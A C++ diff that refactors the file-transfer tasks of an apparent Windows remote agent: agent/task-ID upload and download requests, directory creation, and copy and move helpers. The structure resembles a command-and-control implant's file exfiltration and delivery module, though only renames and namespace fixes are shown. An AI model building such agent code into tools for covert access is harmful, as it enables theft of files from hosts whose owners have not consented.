@@ -1,7 +1,8 @@
 #include "file_tasks.h"
-#include "../config/config.h"
+#include "../core/config.h"
 #include "../utils/encoding.h"
 #include "../core/communication.h"
+#include "../core/agent.h"
 
 #include <windows.h>
 #include <direct.h>
@@ -52,7 +53,7 @@ namespace File {
 
         // Create UploadStart request (HT = 4)
         json startData = {
-            {"agent_id", Config::Agent::GetId()},
+            {"agent_id", Core::Agent::GetId()},
             {"task_id", taskId},
             {"file_name", fileName},
             {"file_size", fileSize},
@@ -137,7 +138,7 @@ namespace File {
 
         // UploadEnd (HT = 6)
         json endData = {
-            {"agent_id", Config::Agent::GetId()},
+            {"agent_id", Core::Agent::GetId()},
             {"task_id", taskId},
             {"status", 4},
             {"result", ""},
@@ -178,7 +179,7 @@ namespace File {
 
         // Build the DownloadStart request (ht == 7)
         json requestData = {
-            {"agent_id", Config::Agent::GetId()},
+            {"agent_id", Core::Agent::GetId()},
             {"task_id", task_id},
             {"file_id", file_id},
             {"ht", 7}  // DownloadStart
@@ -264,7 +265,7 @@ namespace File {
         fclose(fp);
 
         if (written != fileData.size()) {
-            DeleteFile(destinationPath); // Clean up partial file
+            DeleteFileA(destinationPath.c_str()); // Clean up partial file
             return FileResult(false, "Failed to write complete file data");
         }
 
@@ -327,7 +328,7 @@ namespace File {
         return 0;
     }
 
-    bool CreateDirectory(const std::string& dirPath) {
+    bool CreateDirectoryRecursive(const std::string& dirPath) {
         if (dirPath.empty()) return false;
         
         // Check if directory already exists
@@ -340,7 +341,7 @@ namespace File {
         std::string path = dirPath;
         std::replace(path.begin(), path.end(), '/', '\\');
         
-        if (CreateDirectoryA(path.c_str(), NULL)) {
+        if (::CreateDirectoryA(path.c_str(), NULL)) {
             return true;
         }
         
@@ -350,8 +351,8 @@ namespace File {
             size_t pos = path.find_last_of('\\');
             if (pos != std::string::npos) {
                 std::string parent = path.substr(0, pos);
-                if (CreateDirectory(parent)) {
-                    return CreateDirectoryA(path.c_str(), NULL) != FALSE;
+                if (CreateDirectoryRecursive(parent)) {
+                    return ::CreateDirectoryA(path.c_str(), NULL) != FALSE;
                 }
             }
         }
@@ -384,7 +385,7 @@ namespace File {
             return FileResult(false, "Source file does not exist: " + sourcePath);
         }
         
-        BOOL result = CopyFileA(sourcePath.c_str(), destPath.c_str(), overwrite ? FALSE : TRUE);
+        BOOL result = ::CopyFileA(sourcePath.c_str(), destPath.c_str(), overwrite ? FALSE : TRUE);
         if (result) {
             size_t fileSize = GetFileSize(destPath);
             return FileResult(true, "File copied successfully", fileSize);
@@ -404,7 +405,7 @@ namespace File {
             return FileResult(false, "Source file does not exist: " + sourcePath);
         }
         
-        BOOL result = MoveFileA(sourcePath.c_str(), destPath.c_str());
+        BOOL result = ::MoveFileA(sourcePath.c_str(), destPath.c_str());
         if (result) {
             size_t fileSize = GetFileSize(destPath);
             return FileResult(true, "File moved successfully", fileSize);
